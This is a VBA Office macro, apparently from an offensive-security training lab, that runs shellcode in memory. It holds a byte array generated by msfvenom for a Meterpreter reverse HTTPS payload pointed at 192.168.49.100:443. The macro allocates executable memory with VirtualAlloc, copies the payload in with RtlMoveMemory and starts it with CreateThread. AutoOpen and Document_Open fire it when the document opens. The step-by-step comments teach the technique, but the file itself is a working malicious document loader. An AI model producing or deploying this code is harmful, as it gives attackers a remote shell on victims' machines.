'import dll for running shell code in memory
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
    'The Variant data type is the data type for all variables that are not explicitly declared
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    'msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.100 LPORT=443 EXITFUNC=thread -f vbapplication | xclip -sel clip
    'actual shellcode
    buf = Array(232, 143, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, 15, 183, 74, 38, 139, 114, 40, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 73, 117, 239, 82, 139, 82, 16, 139, 66, 60, 87, 1, 208, 139, 64, 120, 133, 192, 116, 76, 1, 208, 139, 88, 32, 1, 211, 80, 139, 72, 24, 133, 201, 116, 60, 49, 255, _
73, 139, 52, 139, 1, 214, 49, 192, 193, 207, 13, 172, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, 36, 117, 224, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, 233, 128, 255, 255, 255, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, _
104, 76, 119, 38, 7, 255, 213, 49, 219, 83, 83, 83, 83, 83, 232, 62, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 49, 59, 32, 84, 114, 105, 100, 101, 110, 116, 47, 55, 46, 48, 59, 32, 114, 118, 58, 49, 49, 46, 48, 41, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, _
0, 104, 58, 86, 121, 167, 255, 213, 83, 83, 106, 3, 83, 83, 104, 187, 1, 0, 0, 232, 0, 1, 0, 0, 47, 80, 88, 111, 70, 112, 78, 102, 113, 110, 116, 104, 115, 48, 87, 51, 81, 68, 97, 69, 45, 82, 81, 100, 68, 67, 117, 77, 107, 55, 104, 76, 48, 49, 111, 118, 89, 52, 118, 119, 118, 72, 49, 84, 48, 122, 57, 57, 52, 85, 67, 87, 109, 73, 118, 69, _
54, 108, 50, 104, 83, 114, 110, 97, 112, 120, 88, 73, 89, 73, 77, 106, 50, 75, 82, 110, 109, 99, 76, 71, 57, 82, 113, 85, 113, 67, 70, 109, 106, 98, 97, 109, 86, 48, 87, 52, 99, 97, 48, 103, 86, 85, 55, 120, 89, 110, 107, 49, 79, 78, 85, 115, 0, 80, 104, 87, 137, 159, 198, 255, 213, 137, 198, 83, 104, 0, 50, 232, 132, 83, 83, 83, 87, 83, 86, 104, _
235, 85, 46, 59, 255, 213, 150, 106, 10, 95, 104, 128, 51, 0, 0, 137, 224, 106, 4, 80, 106, 31, 86, 104, 117, 70, 158, 134, 255, 213, 83, 83, 83, 83, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 20, 104, 136, 19, 0, 0, 104, 68, 240, 53, 224, 255, 213, 79, 117, 205, 232, 75, 0, 0, 0, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 83, 104, _
88, 164, 83, 229, 255, 213, 147, 83, 83, 137, 231, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, 150, 137, 226, 255, 213, 133, 192, 116, 207, 139, 7, 1, 195, 133, 192, 117, 229, 88, 195, 95, 232, 107, 255, 255, 255, 49, 57, 50, 46, 49, 54, 56, 46, 52, 57, 46, 49, 48, 48, 0, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, _
117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
    
    'creating a memory allocation, 0 means start position is define by api, Ubound(buf) return total buffer size
    '0x3000, which equates to the allocation type enums of MEM_COMMIT and MEM_RESERVE
    '0x40 indicating that the memory is readable, writable, and executable
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    'counter start from 0 to the last buffer
    For counter = LBound(buf) To UBound(buf)
        'the data is the buf array content according to counter position
        data = buf(counter)
    
        'res is the final address for the thread process to take place
        '+ is an incremental according to the counter which add to the virtual mem location
        'data will move byte code inside
        '1 is the length
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    'creating the actual execution process
    res = CreateThread(0, 0, addr, 0, 0, 0)
    
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
